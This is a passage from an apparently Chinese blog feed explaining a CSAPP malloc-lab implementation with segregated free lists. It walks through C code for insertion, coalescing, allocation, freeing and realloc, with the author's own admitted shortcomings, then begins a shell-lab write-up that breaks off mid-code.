PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>));<br>  <span class="hljs-comment">// 将这个新的空闲块插入到我们的列表里</span><br>  insert_node(bp, size);<br>  <span class="hljs-keyword">return</span> coalesce(bp);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="insert-node"><a href="#insert-node" class="headerlink" title="insert_node"></a>insert_node</h1><p><code>static void insert_node(void *ptr, size_t size)</code><br>这个函数是将以ptr为bp指针的空闲块给塞到空闲块数组中去，bp指针指的是当前空闲块的有效载荷的第一个字节的地址，也就是头部+WSIZE</p><ol><li>首先找到这个size应该对应数组的哪个下标。（数组的每个下标存储的链表）</li><li>拿到这个下标对应的链表，根据size找到应该插入到这个链表的哪个位置（链表是从小大递增的）</li><li>分情况插入<ol><li>当前链表为空</li><li>在首部插入</li><li>在尾部插入</li><li>在链表中间插入<br>这里具体的实现上就用了一些书上没有的宏定义，有点晦涩，所以解释一下。</li></ol></li><li><code>SET_PTR</code><ol><li><code>#define SET_PTR(p, ptr) (*(unsigned int *)(p) = (unsigned int)(ptr))</code></li><li>将地址p看做指向一个无符号int型整数，即一个32位数的地址，然后将地址ptr看做是一个32位数，即将地址ptr放到地址p指向的位置。</li><li>那么以后<code>*(unsigned int *)(p)</code>就可以得到ptr。</li><li>这个操作是用来存储这个空闲块的pre和next指针用的。p要么是pre指针所在的地址，要么是next指针所在的地址。然后<code>*(unsigned int *)(p)</code>就可以得到pre指针或者next指针</li></ol></li><li><code>GET_PRE_PTR</code><ol><li><code>#define GET_PRE_PTR(ptr) ((void *)(ptr))</code></li><li>这个宏传入一个ptr，这个ptr往往就是一个空闲块的bp指针。通过这个宏，可以得到这个空闲块存储pre指针的位置。</li><li>其实这一波操作之后返回的就是ptr自己，因为说过了，调用这个宏时，ptr往往传入的就是bp，而bp恰好就是空闲块中指向pre指针的指针。</li><li>之所以要做这种脱裤子放屁的事情，一个是为了使用起来更加清晰没有歧义，另一方面是为了和<code>GET_SUCC_PTR</code>的使用统一起来</li><li><code>#define GET_SUCC_PTR(ptr) ((void *)(ptr) + WSIZE)</code>就获得了指向next指针的指针</li></ol></li><li><code>GET_PRE</code><ol><li><code>#define GET_PRE(ptr) (*(void **)(GET_PRE_PTR(ptr)))</code></li><li>这个宏传入一个ptr，这个ptr其实往往就是某个空闲块的bp指针，然后返回这个空闲块存储的pre指针。</li><li>注意了<code>GET_PRE_PTR</code>实际上是指向pre指针的指针，但是呢，因为我们前面的定义中返回的<code>void*</code>，因此，我们需要先将它强制转为<code>void**</code>类型，即指向指针的指针。然后再通过<code>*</code>操作取出来pre空闲块真正的地址。</li><li><code>#define GET_SUCC(ptr) (*(void **)(GET_SUCC_PTR(ptr)))</code>就是取得真正的succ指针<br>这玩意是有点恶心的，对照着下面的代码看，应该就明白了<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">insert_node</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 首先找到这个size应该在哪个格子里</span><br>  <span class="hljs-type">int</span> pos = find_pos(size);<br>  <span class="hljs-comment">// 扫描这个格子里存的链表，找到应该插入的位置</span><br>  <span class="hljs-type">void</span> *pre_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">void</span> *cur_ptr = segregated_free_lists[pos];<br>  <span class="hljs-keyword">while</span> (cur_ptr != <span class="hljs-literal">NULL</span> &amp;&amp; size &gt; GET_SIZE(HDRP(cur_ptr))) &#123;<br>    pre_ptr = cur_ptr;<br>    cur_ptr = GET_SUCC(cur_ptr);<br>  &#125;<br>  <span class="hljs-comment">// 分情况讨论，正常来说，我们应该插入pre_ptr和cur_ptr之间</span><br>  <span class="hljs-comment">// 前驱比自己小，后续比自己大</span><br>  <span class="hljs-comment">// 如果pre_ptr为空</span><br>  <span class="hljs-keyword">if</span> (pre_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-comment">// 如果cur_ptr也为空，说明这个链表就是空的，直接插入即可</span><br>    <span class="hljs-keyword">if</span> (cur_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>      segregated_free_lists[pos] = ptr;<br>      SET_PTR(GET_PRE_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>      SET_PTR(GET_SUCC_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// cur_ptr不为空，说明要插入的是第一个位置</span><br>      segregated_free_lists[pos] = ptr;<br>      SET_PTR(GET_PRE_PTR(cur_ptr), ptr);<br>      SET_PTR(GET_SUCC_PTR(ptr), cur_ptr);<br>      SET_PTR(GET_PRE_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-comment">// pre_ptr不为空</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 如果cur_ptr为空，说明是在链表尾部插入</span><br>    <span class="hljs-keyword">if</span> (cur_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>      SET_PTR(GET_SUCC_PTR(pre_ptr), ptr);<br>      SET_PTR(GET_PRE_PTR(ptr), pre_ptr);<br>      SET_PTR(GET_SUCC_PTR(ptr), <span class="hljs-literal">NULL</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 如果cur_ptr不为空，说明是在链表中间插入</span><br>      SET_PTR(GET_SUCC_PTR(pre_ptr), ptr);<br>      SET_PTR(GET_PRE_PTR(ptr), pre_ptr);<br>      SET_PTR(GET_SUCC_PTR(ptr), cur_ptr);<br>      SET_PTR(GET_PRE_PTR(cur_ptr), ptr);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="coalesce"><a href="#coalesce" class="headerlink" title="coalesce"></a>coalesce</h1><p><code>static void *coalesce(void *bp)</code></p><ol><li>这个函数的作用是将bp指向的空闲块和前后的空闲块合并，但是前后的空闲块也不一定存在，所以要分类讨论</li><li>这个函数返回合并之后的空闲块的起始地址，这个起始地址只会在前面存在空闲块的情况下返回前面空闲块的起始地址，否则就是返回当前的bp<br>具体实现思路</li><li>首先分别获取前面和后面的内存块是否被分配（地址意义上的前后内存块，而不是空闲内存块那个意义上的）</li><li>分类讨论，该合并合并，如果需要合并<ol><li>先将参与合并的空闲内存块在空闲内存数组中给删了</li><li>然后设置合并之后的空闲内存块的首部和尾部</li><li>最后给它加入到空闲内存数组中去<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">coalesce</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp)</span> &#123;<br>  <span class="hljs-comment">// 首先获取前后内存块的状态</span><br>  <span class="hljs-type">int</span> is_pre_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));<br>  <span class="hljs-type">int</span> pre_size = GET_SIZE(HDRP(PREV_BLKP(bp)));<br>  <span class="hljs-type">int</span> is_next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));<br>  <span class="hljs-type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(bp)));<br>  <span class="hljs-type">int</span> cur_size = GET_SIZE(HDRP(bp));<br>  <span class="hljs-comment">// 根据状态分类讨论</span><br>  <span class="hljs-type">int</span> new_size;<br>  <span class="hljs-comment">// 前后均分配了</span><br>  <span class="hljs-keyword">if</span> (is_pre_alloc &amp;&amp; is_next_alloc) &#123;<br>    <span class="hljs-keyword">return</span> bp;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (is_pre_alloc &amp;&amp; !is_next_alloc) &#123;<br>    <span class="hljs-comment">// 前面分配了，后面没分配，所以和后面合并</span><br>    <span class="hljs-comment">// 首先，在空闲块数组中删除这两个块</span><br>    delete_node(bp);<br>    delete_node(NEXT_BLKP(bp));<br>    <span class="hljs-comment">// 然后修改首部和尾部</span><br>    new_size = cur_size + next_size;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!is_pre_alloc &amp;&amp; is_next_alloc) &#123;<br>    delete_node(bp);<br>    delete_node(PREV_BLKP(bp));<br>    new_size = pre_size + cur_size;<br>    <span class="hljs-comment">// 修改当前的bp，因为和前面合并了，现在的bp应该指向前面的块的头部</span><br>    bp = PREV_BLKP(bp);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 前后都是空的</span><br>    delete_node(bp);<br>    delete_node(PREV_BLKP(bp));<br>    delete_node(NEXT_BLKP(bp));<br>    new_size = pre_size + cur_size + next_size;<br>    bp = PREV_BLKP(bp);<br>  &#125;<br>  <span class="hljs-comment">// 修改当前合并后的空闲块的首部和尾部</span><br>  PUT(HDRP(bp), PACK(new_size, <span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 只要设置好了头部，那么尾部就可以直接操作</span><br>  PUT(FTRP(bp), PACK(new_size, <span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 将这个空闲块插入空闲块数组</span><br>  insert_node(bp, new_size);<br>  <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h1 id="mm-malloc"><a href="#mm-malloc" class="headerlink" title="mm_malloc"></a>mm_malloc</h1><p><code>void *mm_malloc(size_t size)</code></p><ol><li>这个函数是分配一个size大小的内存块，并返回这个内存块的bp指针<br>实现思路</li><li>首先要特判size不合法的情况，小于等于0</li><li>然后要调整size<ol><li>如果size不足最小块的要求，将size变为最小快的长度。最小快应该是<code>2*DSIZE</code></li><li>如果size不为8的倍数，修改为8个倍数。之所以要修改为8个倍数，是为了对齐的要求。对齐是为了取内存数据的时候，一次可以成功取出来，避免出现一个数据存在于两个cache行的情况</li></ol></li><li>根据size去空闲内存数组中去找是否有合适的内存块。可能size对应的那个链表中找不到，那就去索引更大的链表中找</li><li>如果实在找不到，那就要申请扩展堆</li><li>最后修改找到的空闲块（这一步通过<code>place</code>操作完成）<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 首先调整size为合法值，最小为2*DSIZE，否则一定要是8的倍数</span><br>  <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size &lt;= DSIZE) &#123;<br>    size = <span class="hljs-number">2</span> * DSIZE;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    size = ALIGN(size + DSIZE);<br>  &#125;<br>  <span class="hljs-comment">// 根据size去空闲块数组里找最合适的那个</span><br>  <span class="hljs-type">int</span> pos = find_pos(size);<br>  <span class="hljs-type">void</span> *fit_ptr = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-keyword">while</span> (pos &lt; LIST_MAX_SIZE) &#123;<br>    <span class="hljs-comment">// 去当前项里面找</span><br>    <span class="hljs-type">void</span> *cur_ptr = segregated_free_lists[pos];<br>    <span class="hljs-keyword">while</span> (cur_ptr != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">if</span> (GET_SIZE(HDRP(cur_ptr)) &lt; size) &#123;<br>        cur_ptr = GET_SUCC(cur_ptr);<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>        fit_ptr = cur_ptr;<br>        <span class="hljs-keyword">break</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (fit_ptr != <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>    pos++;<br>  &#125;<br>  <span class="hljs-comment">// 如果没有足够大的，说明堆要扩充空间了</span><br>  <span class="hljs-keyword">if</span> (fit_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-keyword">if</span> ((fit_ptr = extend_heap(MAX(size, CHUNKSIZE))) == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 在该空闲块中分配size大小的块</span><br>  fit_ptr = place(fit_ptr, size);<br>  <span class="hljs-keyword">return</span> fit_ptr;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="place"><a href="#place" class="headerlink" title="place"></a>place</h1><p><code>static void *place(void *bp, size_t size)</code></p><ol><li>这个函数是将bp所指向的内存块分配size大小的内存走，即留下原大小减去size大小的内存块</li><li>这里用了一个很神奇的优化方法。不是一直把这个空闲块的前size个字节给分配掉，而是根据size的大小讨论，如果比较小就分配前size个字节，如果比较大就分配后size个字节。之所以这样优化，是为了避免一些极端情况下出现很多外部内存碎片</li><li>分配的操作的实现其实是通过设置首部和尾部实现的，分别设置前部和后部的首尾部，就完成了分配的操作，然后将新生成的小空闲内存块给加入到空闲内存数组中去<br>实现思路</li><li>如果剩下的空闲块不足一个最小空闲块，那就直接全部分配</li><li>如果size比较大，分配后size个字节，这个比较大是一个经验值，选一个效果比较好就行了</li><li>如果size比较小，分配前size个字节<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<span class="hljs-title function_">place</span><span class="hljs-params">(<span class="hljs-type">void</span> *bp, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 在bp中分配size大小的空闲块走</span><br>  <span class="hljs-comment">// 先在数组中删除bp空闲块</span><br>  delete_node(bp);<br>  <span class="hljs-comment">// 获得bp块的长度</span><br>  <span class="hljs-type">size_t</span> free_size = GET_SIZE(HDRP(bp));<br>  <span class="hljs-comment">// 如果剩下的小于2*DSIZE，那就不用再插入回去了</span><br>  <span class="hljs-keyword">if</span> (free_size - size &lt; <span class="hljs-number">2</span> * DSIZE) &#123;<br>    PUT(HDRP(bp), PACK(free_size, <span class="hljs-number">1</span>));<br>    PUT(FTRP(bp), PACK(free_size, <span class="hljs-number">1</span>));<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (size &gt;= <span class="hljs-number">96</span>) &#123;<br>    PUT(HDRP(bp), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(bp), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    insert_node(bp, free_size - size);<br>    bp = NEXT_BLKP(bp);<br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-comment">// 注意，这里是把前半部分给分配了，不能修改bp，最后还是要返回bp</span><br>    <span class="hljs-comment">// 前半部分要分配，后半部分重新插入</span><br>    PUT(HDRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>    PUT(FTRP(bp), PACK(size, <span class="hljs-number">1</span>));<br>    <span class="hljs-comment">// 修改bp指向后半段</span><br>    PUT(HDRP(NEXT_BLKP(bp)), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    PUT(FTRP(NEXT_BLKP(bp)), PACK(free_size - size, <span class="hljs-number">0</span>));<br>    <span class="hljs-comment">// 重新放入空闲块数组</span><br>    insert_node(NEXT_BLKP(bp), free_size - size);<br>  &#125;<br>  <span class="hljs-keyword">return</span> bp;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><p><code>void mm_free(void *ptr)</code></p><ol><li>这个函数是将ptr指向的空闲内存块给free掉<br>实现思路</li><li>首先设置首尾部，将其alloc的状态改为0</li><li>然后加入空闲块链表</li><li>最后尝试空闲块的合并<br>其实到这里就可以发现，设置一个块就只需要修改首部和尾部，空闲块再丢入空闲块数组并尝试合并即可<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">mm_free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span> &#123;<br>  <span class="hljs-comment">// 修改标志位</span><br>  <span class="hljs-type">size_t</span> size = GET_SIZE(HDRP(ptr));<br>  PUT(HDRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>  PUT(FTRP(ptr), PACK(size, <span class="hljs-number">0</span>));<br>  <span class="hljs-comment">// 插入空闲列表</span><br>  insert_node(ptr, size);<br>  <span class="hljs-comment">// 尝试合并</span><br>  coalesce(ptr);<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="mm-realloc"><a href="#mm-realloc" class="headerlink" title="mm_realloc"></a>mm_realloc</h1><p><code>void *mm_realloc(void *ptr, size_t size)</code></p><ol><li>这个函数是将ptr指向的块给扩展为size大小</li><li>这里有个优化的思路就是能不copy就尽量不copy，因为如果要copy那就会引起复制以及free当前块。所以最好能和后面的内存块合并。<br>实现思路</li><li>首先需要处理size非法的情况<ol><li>为0啊</li><li>不足最小块的大小的要求啊</li><li>向8对齐啊</li></ol></li><li>如果size小于当前空闲块大小，则直接忽略</li><li>如果这个块是堆的尾部，那么可以试着去扩展堆，这样可以减少copy的操作，但是这个优化可有可无吧只能说</li><li>如果这个块后面是一个空闲块，可以将这个空闲块并入当前块，看看是否可以满足要求，如果可以的话就合并，然后返回答案</li><li>如果上面都不行，那就只能重新malloc然后memcpy，再free掉当前内存块了<br>写博客的时候才发现我下面的实现有几个问题</li><li>扩展堆尾部以及和后面的块合并的时候，如果成功了，那是不是给这个块扩的太多了？超过了它需要的size的要求</li><li>我依稀记得实验文档好像要求可以实现缩小，即size是可以小于当前空闲块大小的，但是我这里是直接忽略了</li><li>上面两个问题好像不对导致结果错误，但是会牺牲空间，并且第2点会带来一点安全隐患，因为我并没有真正的缩小块，用户依然可以访问。只能希望用户在realloc之后，就按他想要的size来操作这个内存块了。</li><li>但是太懒了，不想实现了。<br>代码实现<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mm_realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr, <span class="hljs-type">size_t</span> size)</span> &#123;<br>  <span class="hljs-comment">// 首先检查size的合法性</span><br>  <span class="hljs-keyword">if</span> (size == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>  &#125;<br>  <span class="hljs-comment">// 修改size使其对齐</span><br>  <span class="hljs-keyword">if</span> (size &lt;= DSIZE) &#123;<br>    size = <span class="hljs-number">2</span> * DSIZE;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    size = ALIGN(size + DSIZE);<br>  &#125;<br>  <span class="hljs-comment">// 计算当前块的大小与要求的size的差值</span><br>  <span class="hljs-type">int</span> cur_size = GET_SIZE(HDRP(ptr));<br>  <span class="hljs-type">int</span> change_size = cur_size - size;<br>  <span class="hljs-comment">// 如果size小于等于当前长度，则不需要重新分配</span><br>  <span class="hljs-keyword">if</span> (change_size &gt;= <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">return</span> ptr;<br>  &#125;<br>  <span class="hljs-comment">// 如果当前块后面就是结尾</span><br>  <span class="hljs-keyword">if</span> (GET_SIZE(HDRP(NEXT_BLKP(ptr))) == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// 扩展</span><br>    <span class="hljs-keyword">if</span> (extend_heap(MAX(change_size, CHUNKSIZE)) == <span class="hljs-literal">NULL</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-comment">// 扩展成功，修改头尾部</span><br>    delete_node(NEXT_BLKP(ptr));<br>    PUT(HDRP(ptr), PACK(cur_size + MAX(change_size, CHUNKSIZE), <span class="hljs-number">1</span>));<br>    PUT(FTRP(ptr), PACK(cur_size + MAX(change_size, CHUNKSIZE), <span class="hljs-number">1</span>));<br>    <span class="hljs-keyword">return</span> ptr;<br>  &#125;<br>  <span class="hljs-comment">// 如果当前块后面有个free块，尝试去合并，看看是不是可以</span><br>  <span class="hljs-keyword">if</span> (!GET_ALLOC(HDRP(NEXT_BLKP(ptr)))) &#123;<br>    <span class="hljs-comment">// 如果加起来长度够的话</span><br>    <span class="hljs-type">int</span> next_size = GET_SIZE(HDRP(NEXT_BLKP(ptr)));<br>    <span class="hljs-keyword">if</span> (cur_size + next_size &gt;= size) &#123;<br>      delete_node(NEXT_BLKP(ptr));<br>      PUT(HDRP(ptr), PACK(cur_size + next_size, <span class="hljs-number">1</span>));<br>      PUT(FTRP(ptr), PACK(cur_size + next_size, <span class="hljs-number">1</span>));<br>      <span class="hljs-keyword">return</span> ptr;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 最后一步了，只能去重新申请</span><br>  <span class="hljs-type">void</span> *new_ptr = mm_malloc(size);<br>  <span class="hljs-built_in">memcpy</span>(new_ptr, ptr, cur_size);<br>  mm_free(ptr);<br>  <span class="hljs-keyword">return</span> new_ptr;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h1 id="出现的错误"><a href="#出现的错误" class="headerlink" title="出现的错误"></a>出现的错误</h1><ol><li>死循环：忘记给pos++</li><li>段错误：place的时候，没有正确返回bp指针</li><li>不知名错误：在realocate的时候，在尾部重新申请位置的情况下，忘记把新申请的从空闲块里删除了</li></ol>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>csapp_lab5</title>
    <link href="/2023/08/03/csapp-lab5/"/>
    <url>/2023/08/03/csapp-lab5/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/492645370">参考大佬</a></p><p>前情提要</p><ol><li>这个实验和之前的不太一样，最好要去把书看一遍，很多具体的实验的方法，思想，甚至是代码在书上已经给出了，自己很难想出来</li></ol><h1 id="实验总览"><a href="#实验总览" class="headerlink" title="实验总览"></a>实验总览</h1><ol><li>总共有16个trace，运行make test0x 与 make rtest0x，比较结果是否相同</li><li>实验内容<ul><li><code>eval</code>: Main routine that parses and interprets the command line. 70 lines </li><li><code>builtin cmd</code>: Recognizes and interprets the built-in commands: quit, fg, bg, and jobs. 25 lines</li><li><code>do bgfg</code>: Implements the bg and fg built-in commands. 50 lines</li><li><code>waitfg</code>: Waits for a foreground job to complete. 20 lines</li><li><code>sigchld handler</code>: Catches SIGCHILD signals. 80 lines</li><li><code>sigint handler</code>: Catches SIGINT (ctrl-c) signals. 15 lines</li><li><code>sigtstp handler</code>: Catches SIGTSTP (ctrl-z) signals. 15 lines</li></ul></li></ol><h1 id="什么是shell？"><a href="#什么是shell？" class="headerlink" title="什么是shell？"></a>什么是shell？</h1><p>shell通常用来指命令行，我们可以通过这个命令行去启动各种程序<br>那么，这个命令行是如何启动这些程序的呢？</p><ol><li>shell将自己作为父进程</li><li>shell创建一个子进程去启动各种程序<br>那么，shell其实也就是一个进程，也不过是一个比较特殊的程序，那它这个程序是什么样的呢？</li><li>不断地循环，并打印一个提示符，我们这个lab的提示符就是这样<code>tsh&gt;</code></li><li>然后通过fgets获得我们的输入，我们的输入通常就是程序的路径（名字）以及这个程序的参数</li><li>通过我们的输入去启动程序。这里就有两种程序了，一种是前台程序，一种是后台程序<ol><li>首先要明确一点，前台程序和后台程序没有本质上的区别，运行起来都是一个进程而已</li><li>前台进程比较特殊的一点就是，它会阻塞shell，一直到自己执行完了，然后让shell继续执行</li></ol></li></ol><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><p>eval函数的功能其实类似于一个启动器</p><ol><li>获取我们输入的各种信息</li><li>按照我们的要求去创建子进程，操作父进程</li></ol><p>第一步，获取各种输入的信息，这个就比较简单了，因为已经提供了写好的<code>parseline</code>函数，我们只需要调用即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 首先根据cmdline，解析这一行命令。由于我们在解析的函数中修改了传入的cmdline，所以用了一个备份的buffer。</span><br><span class="hljs-comment">// 同时解析函数的返回值其实就代表了当前这个被命令行启动的进程是前天还是后台运行的</span><br><span class="hljs-comment">// 但是其实好像不备份也行，留坑！</span><br><span class="hljs-type">char</span> buffer[MAXLINE];<br><span class="hljs-built_in">strcpy</span>(buffer, cmdline);<br><span class="hljs-type">char</span> *argv[MAXARGS];<br><span class="hljs-type">int</span> is_bg = 